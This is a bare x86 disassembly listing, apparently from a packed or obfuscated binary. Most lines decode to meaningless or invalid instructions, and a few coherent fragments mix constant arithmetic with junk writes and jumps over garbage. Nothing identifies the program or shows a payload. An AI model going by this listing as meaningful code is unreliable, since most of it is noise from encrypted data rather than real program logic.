  405101:	jle    0x40515d
  405103:	mov    edi,edi
  405105:	sub    DWORD PTR ds:0xf00db7e,ebx
  40510b:	or     ch,BYTE PTR [esi+0xb]
  40510e:	jg     0x405114
  405110:	idiv   ch
  405112:	mov    dh,0xa9
  405114:	test   eax,0xeed9c1
  405119:	xor    al,0x99
  40511b:	xor    BYTE PTR [edi-0x4],dh
  40511e:	call   0x7cf2bb2a
  405123:	add    ecx,edx
  405125:	ja     0x405173
  405127:	mov    eax,0x839cdb55
  40512c:	cmp    dl,BYTE PTR [edx]
  40512e:	icebp  
  40512f:	and    BYTE PTR [eax],0x7e
  405132:	fild   WORD PTR [ebx-0x5ee3542b]
  405138:	stc    
  405139:	das    
  40513a:	es push edi
  40513c:	test   DWORD PTR [ebp+0xbaca3b4],esp
  405142:	mov    al,0xe7
  405144:	sbb    DWORD PTR [ecx],edi
  405146:	jmp    0xcee4:0x48521ab9
  40514d:	dec    eax
  40514e:	hlt    
  40514f:	fdiv   DWORD PTR [eax-0x50]
  405152:	pop    edi
  405153:	dec    ebx
  405154:	imul   eax,esp,0xffffff99
  405157:	rcl    BYTE PTR [ebp+0x2fed92c4],0xc6
  40515e:	xor    dh,BYTE PTR [eax+eax*1+0x72d60d8a]
  405165:	stc    
  405166:	retf   
  405167:	(bad)  
  405168:	jmp    0x7322a8a7
  40516d:	out    dx,eax
  40516e:	xchg   esp,eax
  40516f:	xchg   esi,eax
  405170:	and    BYTE PTR [edx+0x6a2d4825],al
  405176:	mov    esp,0xfb05be1c
  40517b:	retf   
  40517c:	or     dl,BYTE PTR [ecx-0x4c]
  40517f:	loop   0x405113
  405181:	inc    eax
  405182:	xchg   edi,eax
  405183:	int    0xf1
  405185:	ret    0x3035
  405188:	mov    dh,0x48
  40518a:	(bad)  
  40518b:	mov    dh,0x97
  40518d:	js     0x40519d
  40518f:	mov    ah,0xd7
  405191:	stos   BYTE PTR es:[edi],al
  405192:	push   0xffffffeb
  405194:	in     eax,0xbe
  405196:	ins    BYTE PTR es:[edi],dx
  405197:	mov    ds:0xb2a4a61f,eax
  40519c:	out    0xb0,eax
  40519e:	scas   al,BYTE PTR es:[edi]
  40519f:	xlat   BYTE PTR ds:[ebx]
  4051a0:	in     al,dx
  4051a1:	cmp    DWORD PTR [edi+eiz*8-0x426cfbfa],esi
  4051a8:	leave  
  4051a9:	std    
  4051aa:	add    eax,0x99c72bc5
  4051af:	cmp    al,BYTE PTR [eax+0x26dcd055]
  4051b5:	fnstenv [ebx+0x4f]
  4051b8:	xchg   esp,eax
  4051b9:	mov    al,0xe4
  4051bb:	repnz mov bh,0xd3
  4051be:	push   ds
  4051bf:	sub    eax,0x31c18e28
  4051c4:	jo     0x4051cf
  4051c6:	cmp    ax,0x554d
  4051ca:	dec    ebx
  4051cb:	dec    ebx
  4051cc:	dec    eax
  4051cd:	ins    BYTE PTR es:[edi],dx
  4051ce:	mov    bl,0x77
  4051d0:	xor    esp,DWORD PTR [edx-0x35db5f8a]
  4051d6:	shr    BYTE PTR [ecx],1
  4051d8:	jnp    0x405193
  4051da:	cmp    eax,0xc6d423bf
  4051df:	js     0x4051fe
  4051e1:	pusha  
  4051e2:	pop    ebp
  4051e3:	in     eax,0xd0
  4051e5:	or     DWORD PTR [eax-0xc],eax
  4051e8:	xor    eax,0xd9ab1411
  4051ed:	jae    0x4051d0
  4051ef:	xchg   ebp,eax
  4051f0:	dec    ecx
  4051f1:	cs pop ebx
  4051f3:	retf   0x8268
  4051f6:	std    
  4051f7:	iret   
  4051f8:	mov    esp,0x5340365c
  4051fd:	push   esp
  4051fe:	push   esi
  4051ff:	mov    ebx,0x4a5458d9
  405204:	jle    0x4051ec
  405206:	and    dl,0x14
  405209:	mov    WORD PTR [ecx],ds
  40520b:	push   eax
  40520c:	loopne 0x4051bc
  40520e:	mov    DWORD PTR ds:0x49b765e4,edi
  405214:	xchg   esi,eax
  405215:	push   0xffffffba
  405217:	(bad)  
  405219:	es inc edx
  40521b:	out    dx,eax
  40521c:	sbb    dh,al
  40521e:	sbb    BYTE PTR [eax-0x3d601ef8],ah
  405224:	pop    esi
  405225:	or     eax,0x99686c91
  40522a:	mov    dl,0xd4
  40522c:	jp     0x4051c9
  40522e:	stos   DWORD PTR es:[edi],eax
  40522f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405230:	stc    
  405231:	add    bh,BYTE PTR [ebx]
  405233:	sub    al,0x96
  405235:	xor    BYTE PTR [ecx+0x34],ch
  405238:	mov    ebp,0x806f7cb8
  40523d:	scas   eax,DWORD PTR es:[edi]
  40523e:	stos   DWORD PTR es:[edi],eax
  40523f:	scas   eax,DWORD PTR es:[edi]
  405240:	lahf   
  405241:	adc    ch,BYTE PTR [ebx-0x79]
  405244:	jmp    0x5fc5a65f
  405249:	(bad)  
  40524a:	jb     0x40527b
  40524c:	dec    eax
  40524d:	(bad)  
  40524e:	fldlg2 
  405250:	out    0xc3,eax
  405252:	jge    0x4052cc
  405254:	repnz add esp,edi
  405257:	jmp    0xb5a:0xae926b6c
  40525e:	jns    0x405256
  405260:	mov    ds:0x98caa7f,eax
  405265:	xchg   edi,eax
  405266:	leave  
  405267:	pop    ecx
  405268:	xor    BYTE PTR [eax+eax*4+0x0],0xb4
  40526d:	dec    ebp
  40526e:	imul   esi,DWORD PTR [ebp+eiz*4-0x32],0xffffffb6
  405273:	mov    al,0x2
  405275:	(bad)  
  405276:	shr    DWORD PTR [ecx+0x1896d23],cl
  40527c:	cdq    
  40527d:	xor    al,0xef
  40527f:	mov    edx,DWORD PTR [ebx]
  405281:	arpl   WORD PTR [edi+0x693d12d3],bx
  405287:	mov    ebx,0x399d087a
  40528c:	or     al,0x95
  40528e:	xchg   ebx,eax
  40528f:	int    0xc0
  405291:	push   0xa7a63a37
  405296:	mov    edi,0xa4446f4d
  40529b:	and    ebp,DWORD PTR [esi]
  40529d:	or     edx,edi
  40529f:	mov    cl,0xf5
  4052a1:	ret    0xfa48
  4052a4:	jne    0x4052d0
  4052a6:	lds    esi,FWORD PTR [ecx]
  4052a8:	pop    esp
  4052a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052aa:	aam    0xd8
  4052ac:	rol    ah,cl
  4052ae:	xor    DWORD PTR [edx-0x4c],ecx
  4052b1:	inc    esi
  4052b2:	xlat   BYTE PTR ds:[ebx]
  4052b3:	push   esp
  4052b4:	cli    
  4052b5:	jge    0x40526c
  4052b7:	dec    esp
  4052b8:	mov    ds:0xc84f18b2,eax
  4052bd:	cmc    
  4052be:	xchg   ebp,eax
  4052bf:	push   0xeee38104
  4052c4:	dec    eax
  4052c5:	jle    0x40533f
  4052c7:	mov    eax,ds:0x2b37458b
  4052cc:	xchg   ecx,eax
  4052cd:	sbb    al,0x22
  4052cf:	mov    ds:0xc103f233,eax
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x2e14fef8]
  405306:	push   esi
  405307:	mov    ah,0xc6
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x4052ef
  405311:	lods   eax,DWORD PTR ds:[esi]
  405312:	lea    esp,[eax+0x5a42df44]
  405318:	xor    al,0xbd
  40531a:	setnp  BYTE PTR [eax]
  40531d:	sub    BYTE PTR [edx+0x5b93d977],dh
  405323:	sub    esi,DWORD PTR [ebx+0x5575c0e2]
  405329:	push   esi
  40532a:	adc    al,0xce
  40532c:	lahf   
  40532d:	pusha  
  40532e:	xor    BYTE PTR [ecx+ebx*2+0x720b2ad4],bl
  405335:	inc    edi
  405336:	es test eax,0x58a7f181
  40533c:	push   esp
  40533d:	push   esp
  40533e:	leave  
  40533f:	xor    DWORD PTR ds:0x6371396a,0x48
  405346:	inc    eax
  405347:	lods   al,BYTE PTR ds:[esi]
  405348:	popf   
  405349:	jmp    0xbb65513e
  40534e:	and    BYTE PTR [edx+0x10],0x29
  405352:	jo     0x40532b
  405354:	add    edx,esp
  405356:	adc    al,0xd8
  405358:	sbb    esi,DWORD PTR [esi]
  40535a:	xchg   DWORD PTR gs:[edi+0x3e68f14d],edi
  405361:	jg     0x4053c2
  405363:	ins    DWORD PTR es:[edi],dx
  405364:	add    DWORD PTR [ebp+0x67],edx
  405367:	sbb    BYTE PTR [edx],0xbe
  40536a:	cmp    al,0x11
  40536c:	out    dx,al
  40536d:	jbe    0x4053ca
  40536f:	inc    ebx
  405370:	data16 (bad) 
  405372:	mov    dh,0xe5
  405374:	mov    esp,0xbad4a9d4
  405379:	call   0x3048553f
  40537e:	lock je 0x405388
  405381:	sbb    al,0x92
  405383:	xor    dl,BYTE PTR cs:[ebx-0x579cab8e]
  40538a:	sbb    DWORD PTR [edi-0x3c],0x60416d6e
  405391:	dec    edi
  405392:	sbb    ch,BYTE PTR [esi-0x60]
  405395:	loopne 0x405328
  405397:	cmp    ebx,esi
  405399:	mov    WORD PTR gs:[ebp+0x7793c333],ss
  4053a0:	mov    al,ds:0xba7c2fc2
  4053a5:	shl    BYTE PTR [ecx-0x54],1
  4053a8:	ds pop es
  4053aa:	add    esi,edx
  4053ac:	and    edx,0xe3d7f944
  4053b2:	dec    esp
  4053b3:	jle    0x405378
  4053b5:	mov    BYTE PTR [ecx-0x6e],cl
  4053b8:	out    0x11,eax
  4053ba:	sbb    DWORD PTR [eax+0x1],edi
  4053bd:	xor    al,0xe9
  4053bf:	notrack call DWORD PTR [ecx+0x5f]
  4053c3:	xchg   ecx,eax
  4053c4:	mov    ecx,0xe27f5502
  4053c9:	aas    
  4053ca:	ja     0x4053a5
  4053cc:	addr16 out dx,eax
  4053ce:	fs xchg esi,eax
  4053d0:	mov    ebp,0xe31e7a04
  4053d5:	shl    DWORD PTR [edi],1
  4053d7:	pop    ebp
  4053d8:	sbb    DWORD PTR [ecx],0xe220d797
  4053de:	mov    esp,0xde5f2034
  4053e3:	ja     0x4053bf
  4053e5:	icebp  
  4053e6:	lods   eax,DWORD PTR ds:[esi]
  4053e7:	(bad)  
  4053e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053e9:	pop    edx
  4053ea:	xchg   esi,eax
  4053eb:	sbb    eax,0xfa0f8bca
  4053f0:	out    dx,al
  4053f1:	bound  edi,QWORD PTR [edi+0x44ee3a54]
  4053f7:	cdq    
  4053f8:	bound  ebp,QWORD PTR [ebx+eiz*4+0x298c5bd4]
  4053ff:	push   ss
  405400:	ffree  st(2)
  405402:	add    bl,BYTE PTR [ebx-0x33013197]
  405408:	dec    esi
  405409:	inc    ebx
  40540a:	push   0xffffffa4
  40540c:	pop    edi
  40540d:	pop    ebp
  40540f:	call   0x83396696
  405414:	dec    ebp
  405415:	arpl   WORD PTR [edi],di
  405417:	mov    al,BYTE PTR [ecx+0xc6c3d2d]
  40541d:	std    
  40541e:	push   ecx
  40541f:	adc    BYTE PTR [edx-0x7a26ec5c],al
  405425:	test   DWORD PTR [esi-0xa331f3a],0x7511ae1f
  40542f:	pop    edi
  405430:	call   0x365d:0xb5c55587
  405437:	stos   BYTE PTR es:[edi],al
  405438:	je     0x4053e9
  40543a:	cmp    ch,dl
  40543c:	test   al,0xb1
  40543e:	outs   dx,DWORD PTR ds:[esi]
  40543f:	mov    BYTE PTR [ecx-0x7b2b7296],dl
  405445:	daa    
  405446:	in     eax,dx
  405447:	pushf  
  405448:	or     DWORD PTR [ebp-0x3e],esp
  40544b:	je     0x40546e
  40544d:	mul    DWORD PTR [edx-0x755a6fad]
  405453:	inc    edi
  405454:	das    
  405455:	adc    DWORD PTR [ebx],esp
  405457:	adc    ecx,DWORD PTR [eax+0x6d]
  40545a:	inc    esi
  40545b:	inc    esp
  40545c:	loop   0x40540b
  40545e:	out    dx,al
  40545f:	cmp    eax,0x5baaabad
  405464:	and    BYTE PTR [ecx+eiz*8-0x629d08a3],0xf8
  40546c:	xchg   edx,eax
  40546d:	outs   dx,DWORD PTR ds:[esi]
  40546e:	arpl   WORD PTR [ebx-0x1d],dx
  405471:	mov    cl,0xc5
  405473:	xchg   edi,ebx
  405475:	shl    bh,1
  405477:	or     eax,0x72c33dee
  40547c:	adc    dh,BYTE PTR [ebp-0x22]
  40547f:	(bad)  
  405480:	in     al,0xee
  405482:	adc    BYTE PTR [ebp-0x4e4bce78],dh
  405488:	and    BYTE PTR ds:0xc25ae334,dh
  40548e:	sbb    BYTE PTR [edi+0x18],bl
  405491:	dec    ecx
  405492:	push   esi
  405493:	add    BYTE PTR [edi+esi*8-0x34],bl
  405497:	ins    BYTE PTR es:[edi],dx
  405498:	ja     0x405455
  40549a:	retf   
  40549b:	icebp  
  40549c:	or     BYTE PTR [eax+0xe],ah
  40549f:	scas   al,BYTE PTR es:[edi]
  4054a0:	pop    ebp
  4054a1:	in     eax,dx
  4054a2:	call   0xacd90987
  4054a7:	xor    al,0x1e
  4054a9:	shr    bh,1
  4054ab:	pop    edx
  4054ac:	mov    bh,0x51
  4054ae:	test   DWORD PTR [edi],edi
  4054b0:	sub    al,0x48
  4054b2:	outs   dx,BYTE PTR ds:[esi]
  4054b3:	xor    DWORD PTR [ebp-0x7c8ae11b],ecx
  4054b9:	(bad)  
  4054ba:	mov    dl,0xd8
  4054bc:	inc    ecx
  4054bd:	imul   ebx,DWORD PTR [esi-0x1f],0x46f7458a
  4054c4:	jmp    0x405538
  4054c6:	adc    DWORD PTR [edi],ebx
  4054c8:	stc    
  4054c9:	mov    edx,0x7e9b28e2
  4054ce:	(bad)  
  4054cf:	fistp  DWORD PTR [edi+0x20]
  4054d2:	push   edi
  4054d3:	pop    ebp
  4054d4:	fldenv [ebp-0x6d]
  4054d7:	in     al,0x65
  4054d9:	push   ss
  4054da:	call   0xfaf6ac7e
  4054df:	jb     0x40548a
  4054e1:	adc    cl,BYTE PTR [edx-0x2e]
  4054e4:	rcr    BYTE PTR [eax-0x2906552e],cl
  4054ea:	add    esi,edx
  4054ec:	mov    BYTE PTR [eax+eiz*8+0x54],bh
  4054f0:	jo     0x405530
  4054f2:	inc    esp
  4054f3:	int    0x5f
  4054f5:	loope  0x4054c0
  4054f7:	fadd   st(1),st
  4054f9:	(bad)  
  4054fb:	lods   al,BYTE PTR ds:[esi]
  4054fc:	rcl    BYTE PTR [edx+0x19cb8021],cl
  405502:	mov    ch,0x53
  405504:	(bad)  
  405505:	mul    DWORD PTR [ebp+0x77be2ff6]
  40550b:	sub    eax,0x289bd693
  405510:	or     eax,0xa0e5a0e
  405515:	pop    ebx
  405516:	fidiv  WORD PTR [edi+0x6b724ee7]
  40551c:	lods   eax,DWORD PTR ds:[esi]
  40551d:	sbb    edi,esi
  40551f:	mov    edx,0x2912049d
  405524:	mov    ecx,0xc2cec83d
  405529:	(bad)  
  40552a:	sar    DWORD PTR [bx],0xc8
  40552e:	cmp    eax,0x8a4ce579
  405533:	inc    esp
  405534:	inc    ecx
  405535:	pusha  
  405536:	adc    al,0xe7
  405538:	mov    al,ds:0x16b3ad2a
  40553d:	push   ds
  40553e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40553f:	pusha  
  405540:	mov    edx,0x9eff0b4
  405545:	out    dx,al
  405546:	sahf   
  405547:	loope  0x40550f
  405549:	ror    BYTE PTR [eax+0x16019d6c],cl
  40554f:	and    eax,DWORD PTR [ecx-0x53]
  405552:	xchg   ebp,eax
  405553:	xchg   ebp,eax
  405554:	jle    0x405555
  405556:	ins    BYTE PTR es:[edi],dx
  405557:	push   ds
  405558:	jno    0x40556e
  40555a:	lock gs test eax,0xd45ac4e8
  405561:	retf   
  405562:	ins    BYTE PTR es:[edi],dx
  405563:	not    edx
  405565:	push   esi
  405566:	das    
  405567:	jecxz  0x405584
  405569:	(bad)  
  40556a:	out    0x9d,eax
  40556c:	mov    al,0xb9
  40556e:	cmp    edi,edx
  405570:	and    al,0xcb
  405572:	outs   dx,DWORD PTR fs:[esi]
  405574:	push   esp
  405575:	ins    BYTE PTR es:[edi],dx
  405576:	mov    bh,0x3
  405578:	icebp  
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xa6943e84
  405600:	dec    eax
  405601:	scas   eax,DWORD PTR es:[edi]
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x40567a
  40560a:	mov    ecx,0x41bb95e8
  40560f:	out    0xf7,eax
  405611:	xor    ebp,edi
  405613:	retf   0xf8cb
  405616:	retf   
  405617:	dec    esi
  405618:	fwait
  405619:	mov    ah,0x5f
  40561b:	xchg   esp,eax
  40561c:	and    eax,0x24bbe352
  405621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405622:	outs   dx,BYTE PTR ds:[esi]
  405623:	(bad)  
  405625:	adc    ecx,DWORD PTR ds:0xf3e10c14
  40562b:	pop    es
  40562c:	adc    al,0xf1
  40562e:	add    ebp,DWORD PTR [eax+eiz*1-0x4fe0b7d2]
  405635:	and    esi,eax
  405637:	xchg   ebx,eax
  405638:	pop    ebx
  405639:	inc    esp
  40563a:	aam    0xb2
  40563c:	pop    ebp
  40563d:	mov    ebx,0xf1431a0f
  405642:	sub    eax,0x709d966d
  405647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405648:	jge    0x40561a
  40564a:	clc    
  40564b:	cwde   
  40564c:	pop    ss
  40564d:	out    0x30,eax
  40564f:	sbb    al,BYTE PTR [edi]
  405651:	mov    al,ds:0x7808ab3c
  405656:	pop    es
  405657:	inc    esi
  405658:	movups XMMWORD PTR [edi-0x1cf7d4cf],xmm2
  40565f:	and    BYTE PTR [ecx+0x62768ad4],al
  405665:	cwde   
  405666:	daa    
  405667:	dec    esp
  405668:	les    eax,FWORD PTR [ebx+ecx*2]
  40566b:	dec    edi
  40566c:	mov    al,ds:0x66881b23
  405671:	lock dec eax
  405673:	sbb    ah,BYTE PTR [eax-0xa]
  405676:	pop    ss
  405677:	std    
  405678:	push   eax
  405679:	test   bl,cl
  40567b:	lahf   
  40567c:	or     BYTE PTR [edx-0x231d984f],al
  405682:	mov    esi,0x3aa30f38
  405687:	mov    esi,0x2aa2e0e8
  40568c:	jae    0x4056c1
  40568e:	repnz dec edi
  405690:	mov    dh,0x3b
  405692:	je     0x405622
  405694:	mov    ebp,0xc1251e2a
  405699:	sti    
  40569a:	bound  esi,QWORD PTR [edx]
  40569c:	(bad)  
  40569d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40569f:	mov    DWORD PTR [eax],ebx
  4056a1:	cmp    ebp,DWORD PTR [esp+eiz*2]
  4056a4:	xchg   DWORD PTR [eax],ebx
  4056a6:	nop
  4056a7:	sbb    esi,DWORD PTR [ebx]
  4056a9:	pop    ds
  4056aa:	lods   al,BYTE PTR ds:[esi]
  4056ab:	(bad)  
  4056ac:	(bad)  
  4056ad:	mov    edx,DWORD PTR [ecx]
  4056af:	push   esi
  4056b0:	ins    BYTE PTR es:[edi],dx
  4056b1:	fnstsw WORD PTR [edi+0x46]
  4056b4:	push   cs
  4056b5:	xor    dh,BYTE PTR [esi-0x12]
  4056b8:	rcr    BYTE PTR [eax],cl
  4056ba:	cmc    
  4056bb:	jecxz  0x40572f
  4056bd:	sbb    dl,dh
  4056bf:	nop
  4056c0:	inc    esi
  4056c1:	outs   dx,DWORD PTR ds:[esi]
  4056c2:	repnz out 0x81,eax
  4056c5:	aaa    
  4056c6:	pop    ebp
  4056c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c8:	shl    BYTE PTR [ebp+0x19],0xd8
  4056cc:	dec    edx
  4056cd:	push   ds
  4056ce:	leave  
  4056cf:	mov    edi,0xc9f69f7
  4056d4:	inc    esp
  4056d5:	mov    ds:0xf582bcb7,eax
  4056da:	outs   dx,DWORD PTR ds:[esi]
  4056db:	stc    
  4056dc:	adc    eax,0x659c7cb8
  4056e1:	cmp    bh,BYTE PTR [ebx+0x2bc65f1c]
  4056e7:	inc    esp
  4056e8:	mov    esp,0xc5808539
  4056ed:	test   al,0x76
  4056ef:	enter  0xaae2,0x7b
  4056f3:	jmp    0x643cbda0
  4056f8:	add    BYTE PTR [edx+ebp*4],0x61
  4056fc:	rcr    esi,1
  4056fe:	lods   eax,DWORD PTR ds:[esi]
  4056ff:	jo     0x40569f
  405701:	xchg   ecx,eax
  405702:	ins    BYTE PTR es:[edi],dx
  405703:	and    eax,eax
  405705:	(bad)  
  405706:	push   edi
  405707:	arpl   ax,bp
  405709:	loope  0x40577b
  40570b:	mov    bl,0xa1
  40570d:	mov    al,0x6c
  40570f:	ja     0x405714
  405711:	(bad)  
  405713:	jne    0x4056c8
  405715:	sbb    eax,0xc9897f8a
  40571a:	jecxz  0x405757
  40571c:	xchg   ecx,eax
  40571d:	cmps   BYTE PTR fs:[si],BYTE PTR es:[di]
  405720:	pminsw mm1,QWORD PTR [edx+edx*2]
  405724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405725:	or     al,BYTE PTR [ebx+0x61]
  405728:	(bad)  
  405729:	into   
  40572a:	mov    al,0x60
  40572c:	std    
  40572d:	sbb    ebp,DWORD PTR [edi-0xb]
  405730:	dec    ebx
  405731:	push   edx
  405732:	push   ecx
  405733:	xor    ebx,ecx
  405735:	adc    al,0x47
  405737:	not    ah
  405739:	push   ebx
  40573a:	(bad)  
  40573c:	and    al,0x3a
  40573e:	dec    esp
  40573f:	pop    edi
  405740:	jl     0x4056f8
  405742:	adc    cl,BYTE PTR [ecx-0x54]
  405745:	cmp    DWORD PTR [esi-0x7c346d5b],0x23
  40574c:	in     eax,0xdc
  40574e:	nop
  40574f:	mov    bh,0x30
  405751:	mov    ch,0x7a
  405753:	call   0x75cbae41
  405758:	adc    BYTE PTR [ecx+0x43436a25],al
  40575e:	add    BYTE PTR [eax],al
  405760:	add    BYTE PTR [eax],al
  405762:	add    BYTE PTR [ebx+0x43436a15],cl
  405768:	add    BYTE PTR [edx-0x77],al
  40576b:	adc    eax,0x43436a
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x8f519e0f
  4057ff:	daa    
  405800:	adc    BYTE PTR [ebx+esi*2],al
  405803:	aaa    
  405804:	jo     0x405876
  405806:	les    edi,FWORD PTR [edi+0x70]
  405809:	jo     0x4057fd
  40580b:	and    DWORD PTR [edi+ebp*4],0xffffffd1
  40580f:	push   es
  405810:	jecxz  0x40581f
  405812:	add    al,0xee
  405814:	leave  
  405815:	mov    bl,0x75
  405817:	outs   dx,BYTE PTR ds:[esi]
  405818:	mov    ?,ecx
  40581a:	in     eax,0xa4
  40581c:	jl     0x4057e0
  40581e:	mov    cl,0x2b
  405820:	and    BYTE PTR [ebx-0x148276e2],ch
  405826:	in     eax,dx
  405827:	mov    DWORD PTR [ecx],ebx
  405829:	mov    eax,0x19f6dc48
  40582e:	repnz out dx,al
  405830:	push   0x10
  405832:	into   
  405833:	pop    ds
  405834:	rcl    eax,1
  405836:	jbe    0x4057c0
  405838:	xor    DWORD PTR [edx+0x4d],eax
  40583b:	mov    esp,0xbde1dc9
  405840:	mov    DWORD PTR [esi+0x5cb2780f],ebp
  405846:	jle    0x405865
  405848:	cmc    
  405849:	cmp    DWORD PTR [eax+0x8e4a023],ecx
  40584f:	cmp    al,0xda
  405851:	push   esi
  405852:	in     eax,dx
  405853:	mov    ebp,0x9bf705a8
  405858:	nop
  405859:	mov    ebp,DWORD PTR [ebx+eiz*1]
  40585c:	or     ebx,eax
  40585e:	mov    cl,0x2f
  405860:	out    dx,eax
  405861:	jmp    0xc3f36170
  405866:	push   eax
  405867:	ret    
  405868:	pop    ss
  405869:	dec    edx
  40586a:	pop    es
  40586b:	stos   BYTE PTR es:[edi],al
  40586c:	inc    edi
  40586d:	inc    esp
  40586e:	xchg   edi,eax
  40586f:	sub    eax,ebx
  405871:	icebp  
  405872:	out    0x5,al
  405874:	jg     0x40587e
  405876:	mov    ebp,0xd9b03a7a
  40587b:	jg     0x4058a8
  40587d:	push   ecx
  40587e:	jae    0x40580d
  405880:	int    0x10
  405882:	mov    ds:0x28e5a466,eax
  405887:	test   BYTE PTR [ecx-0x34c848cd],al
  40588d:	mov    cl,0x58
  40588f:	push   ebx
  405890:	sub    al,0x6
  405892:	cmp    ebx,DWORD PTR [ebx+0x165af2a5]
  405898:	stos   BYTE PTR es:[edi],al
  405899:	sbb    ebp,ecx
  40589b:	sub    edi,DWORD PTR [eax-0x3ff7b768]
  4058a1:	push   ebp
  4058a2:	out    0x83,al
  4058a4:	call   0x7d69f5fc
  4058a9:	popa   
  4058aa:	and    DWORD PTR [eax-0x12],0x73
  4058ae:	xlat   BYTE PTR ds:[ebx]
  4058af:	xchg   ecx,eax
  4058b0:	adc    DWORD PTR [esi-0x35],edx
  4058b3:	std    
  4058b4:	mov    al,0xe0
  4058b6:	or     cl,BYTE PTR [esi]
  4058b8:	sbb    BYTE PTR [eax],dh
  4058ba:	lods   eax,DWORD PTR ds:[esi]
  4058bb:	and    al,0x73
  4058bd:	loop   0x40592f
  4058bf:	jo     0x405860
  4058c1:	imul   eax,DWORD PTR [eax+eax*2-0x4fe4cf2e],0xd6779c86
  4058cc:	mov    esp,DWORD PTR [ebp+0x4a]
  4058cf:	repz dec ebp
  4058d1:	sbb    BYTE PTR [edx+0x7f1e60bb],al
  4058d7:	fndisi(8087 only) 
  4058d9:	int    0x10
  4058db:	lods   al,BYTE PTR ds:[esi]
  4058dc:	jo     0x4058ad
  4058de:	and    esp,ebx
  4058e0:	fidivr DWORD PTR [edi]
  4058e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e3:	inc    edi
  4058e4:	lods   al,BYTE PTR ds:[esi]
  4058e5:	mov    al,ds:0xa9f3c639
  4058ea:	or     ebp,esp
  4058ec:	and    BYTE PTR [ecx],al
  4058ee:	mov    BYTE PTR [eax-0x4af2be83],0x48
  4058f5:	pushf  
  4058f6:	dec    eax
  4058f7:	cmp    al,0xd9
